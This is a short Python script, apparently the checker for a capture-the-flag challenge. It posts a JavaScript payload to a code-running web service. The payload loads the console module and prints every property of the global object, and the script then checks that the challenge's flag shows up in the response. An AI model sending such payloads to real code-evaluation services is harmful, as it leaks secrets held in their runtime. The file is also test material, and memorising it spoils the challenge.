import requests
import argparse
import yaml
from pathlib import Path

HERE = Path(__file__).parent
FLAG = yaml.safe_load(open(HERE / "meta.yml"))["flags"]


def test(url):
    res = requests.post(url,data={"content":\
        'console = require("console")\n\
for(const key of Object.getOwnPropertyNames(this)) {\n\
    console.log(key,this[key])\n\
}\n'})
    assert FLAG in res.text, res.text


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("url", default="http://localhost/", nargs="?")
    args = parser.parse_args()

    test(args.url)
